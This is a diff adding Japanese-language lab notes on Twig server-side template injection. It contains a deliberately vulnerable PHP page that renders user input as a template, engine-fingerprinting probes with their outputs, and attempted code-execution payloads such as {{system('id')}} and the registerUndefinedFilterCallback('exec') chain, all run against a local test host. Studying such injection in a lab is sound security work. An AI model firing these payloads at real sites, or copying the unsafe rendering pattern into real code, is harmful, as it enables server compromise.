@@ -163,6 +163,70 @@ AksCy1ZQ8g****J5grndNk6e
 http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={}
 kXunBvWJh0{}wrFURs4H6f
 ```
+#### twig
+```php
+<?php
+
+function generateRandomString($length = 10) {
+    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
+}
+
+require_once './lib/Twig-1.24.1/lib/Twig/Autoloader.php';
+Twig_Autoloader::register();
+
+// Run render via CLI
+if (php_sapi_name() == "cli") {
+    $_GET["inj"] = '';
+    $_GET["tpl"] = "";
+} 
+
+$inj=$_GET["inj"];
+if(isset($_GET["tpl"])) {
+  // Keep the formatting a-la-python
+  $tpl=str_replace("%s", $inj, $_GET["tpl"]);
+}
+else {
+  $tpl=$inj;
+}
+
+error_log('DEBUG: ' . $tpl);
+
+$loader = new Twig_Loader_Array(array(
+    'tpl' => $tpl,
+));
+$twig = new Twig_Environment($loader);
+
+echo generateRandomString() . $twig->render('tpl') . generateRandomString();
+ ?>
+ ```
+以下でTwigかJinja2かまで絞れるらしい。   
+```txt
+http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj=*
+Zrqshc5ipK*0ZtRqxO5nV
+
+http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj=${7*7}
+VqA0Fza9sE${7*7}fVCkzjUw3r
+
+http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{7*7}}
+eETDOLZaXq4948ghPHSBZC
+
+http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{7*%277%27}}
+KNXoxPeU3v49Tj3nD2FSaB
+```
+以下は全部うまく行ってないな…。   
+```txt
+http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{system(%27id%27)}}
+Fatal error: Uncaught Twig_Error_Syntax: The function "system" does not exist in "tpl" at line 1 in /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php:572 Stack trace: #0 /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php(351): Twig_ExpressionParser->getFunctionNodeClass('system', 1) #1 /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php(144): Twig_ExpressionParser->getFunctionNode('system', 1) #2 /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php(84): Twig_ExpressionParser->parsePrimaryExpression() #3 /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php(41): Twig_ExpressionParser->getPrimary() #4 /var/www/html/lib/Twig-1.19.0/lib/Twig/Parser.php(141): Twig_ExpressionParser->parseExpression() #5 /var/www/html/lib/Twig-1.19.0/lib/Twig/Parser.php(95): Twig_Parser->subparse(NULL, false) #6 /var/www/html/lib/Twig-1.19.0/lib/Twig/Environment.php(544): Twig_Parser->parse(Object(Twig_TokenStream)) #7 /var/www/html/lib/Twig-1.19.0/lib/Twig/Environment.php(596): Twig_Environment->parse(Obj in /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php on line 572
+
+http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{_self.env.registerUndefinedFilterCallback(%22exec%22)}}
+bmlikECRBNJAUrW3Sm5k
+
+http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{_self.env.getFilter(%22id%22)}}
+UtRvAOJ2Ww2XWUpgIfMa
+
+http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{_self.env.setCache(%22http://127.0.0.1:9500%22)}}
+ouc3MNd81U9v7WqfaxuT
+```
 ### Java
 ### python
 ### Ruby
